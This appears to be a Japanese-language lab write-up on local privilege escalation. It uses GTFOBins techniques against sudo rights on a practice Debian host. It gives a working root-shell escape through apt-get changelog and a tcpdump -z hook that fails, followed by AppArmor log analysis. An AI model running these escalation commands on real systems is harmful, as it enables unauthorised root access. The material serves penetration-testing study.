```bash
sudo -l
(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
#### [GTFOBins](https://gtfobins.github.io/)でそれぞれの権限昇格手法を検索する
apt-get->Sudo->(a)
#apt-get（成功例）
```bash
sudo apt-get changelog apt
#対話式のヘルプ画面が立ち上がるので、以下を入力
!/bin/sh
#rootになっている!
```

tcpump->Sudo
#tcpdump（失敗例）
```bash
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied #失敗

#失敗した理由の調査
cat /var/log/syslog | grep tcpdump
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000

#Apparmorのステータス確認
su - root
aa-status
 /usr/sbin/tcpdump
```